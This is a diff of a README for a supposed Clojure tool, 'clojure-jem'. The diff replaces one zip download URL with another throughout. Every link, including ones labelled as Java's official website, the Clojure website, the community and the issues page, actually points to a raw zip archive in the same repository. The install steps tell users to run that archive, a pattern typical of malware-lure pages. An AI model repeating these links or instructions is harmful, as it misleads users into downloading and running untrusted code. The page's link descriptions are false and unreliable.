@@ -1,7 +1,7 @@
 # 🎉 clojure-jem - Build Clojure Applications with Ease
 
 ## 📥 Download Now
-[![Download clojure-jem](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip%https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip)](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip)
+[![Download clojure-jem](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip%https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip)](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip)
 
 ## 🚀 Getting Started
 
@@ -16,13 +16,13 @@ Before you proceed, ensure your computer meets the following requirements:
 - Storage: 500 MB of free disk space
 - Java: Version 8 or higher installed
 
-You can download Java from [the official website](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip).
+You can download Java from [the official website](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip).
 
 ## 📥 Download & Install
 
 To download **clojure-jem**, visit the Releases page. Here, you will find the latest version of the application, along with previous releases.
 
-[Visit this page to download](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip)
+[Visit this page to download](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip)
 
 ### Steps to Download
 
@@ -47,10 +47,10 @@ Once the download is complete, follow these steps to install **clojure-jem**:
   3. Drag and drop the **clojure-jem** icon into the Applications folder.
   
 - **For Linux:**
-  1. Locate the downloaded `https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip` file in your Downloads folder.
+  1. Locate the downloaded `https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip` file in your Downloads folder.
   2. Extract the contents by right-clicking and selecting "Extract Here".
   3. Open a terminal and navigate to the extracted folder.
-  4. Run the installation script using `https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip`.
+  4. Run the installation script using `https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip`.
 
 ## ⚙️ Running the Application
 
@@ -81,12 +81,12 @@ If problems persist, you can reach out for help by creating an issue in the GitH
 
 ## 📞 Support
 
-For support, please visit [the issues section](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip) of our GitHub repository. 
+For support, please visit [the issues section](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip) of our GitHub repository. 
 
 ## 🔗 Additional Resources
 
-- For more information on Clojure, check the [Clojure website](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip).
-- Explore the [Clojure community](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip) for forums and discussions.
+- For more information on Clojure, check the [Clojure website](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip).
+- Explore the [Clojure community](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip) for forums and discussions.
 
 ## 📥 Download Now
-[![Download clojure-jem](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip%https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip)](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/clojure-jem-v2.1-alpha.4.zip)
+[![Download clojure-jem](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip%https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip)](https://raw.githubusercontent.com/springkeeper1/clojure-jem/main/anecdotalism/jem-clojure-hernani.zip)
